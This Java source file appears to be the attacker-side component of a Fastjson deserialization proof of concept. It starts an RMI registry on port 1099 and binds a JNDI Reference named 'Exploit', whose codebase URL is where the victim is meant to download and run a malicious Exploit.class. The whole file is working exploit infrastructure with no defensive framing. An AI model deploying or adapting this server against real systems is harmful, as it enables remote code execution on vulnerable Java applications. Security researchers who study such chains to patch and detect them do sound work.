package fastjson;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

@SuppressWarnings("restriction")
public class Rmi {
    /***
     * 启动RMI服务
     *
     * @throws Exception
     */
    public static void lanuchRMIregister(String host) throws Exception {
        System.out.println("Creating RMI Registry on port 1099");
        Registry registry = LocateRegistry.createRegistry(1099);
        // 最终下载恶意类的地址为http://x.x.x.x/Exploit.class
        Reference reference = new Reference("Exploit", "Exploit", "http://127.0.0.1/");
        // Reference包装类Exploit
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
    }
    public static void main(String[] args) throws Exception {
        //System.out.println("usage: java -jar fastjson_poc.jar ip\n");

        lanuchRMIregister(args[0]);
    }
}
